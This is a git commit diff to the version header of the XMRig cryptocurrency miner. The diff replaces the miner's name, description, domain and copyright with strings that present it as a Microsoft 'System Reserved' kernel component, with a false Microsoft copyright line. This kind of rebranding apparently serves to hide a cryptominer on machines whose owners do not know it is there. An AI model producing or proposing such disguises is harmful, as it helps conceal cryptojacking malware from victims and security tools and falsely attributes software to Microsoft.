186fcd13608c7e53eaec9cb95c90443217e51e61
tr1fled <124415108+tr1fled@users.noreply.github.com>
2024-06-13 20:59:09 -0600

    Update version.h

--- src/version.h
+++ src/version.h
@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig miner"
-#define APP_VERSION   "6.21.3"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2024 xmrig.com"
-#define APP_KIND      "miner"
+#define APP_ID        "sysreserved"
+#define APP_NAME      "System Reserved"
+#define APP_DESC      "System Reserved"
+#define APP_VERSION   "10"
+#define APP_DOMAIN    "microsoft.com"
+#define APP_SITE      "microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 1980-2024 Microsoft Corporation"
+#define APP_KIND      "Kernel"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  21
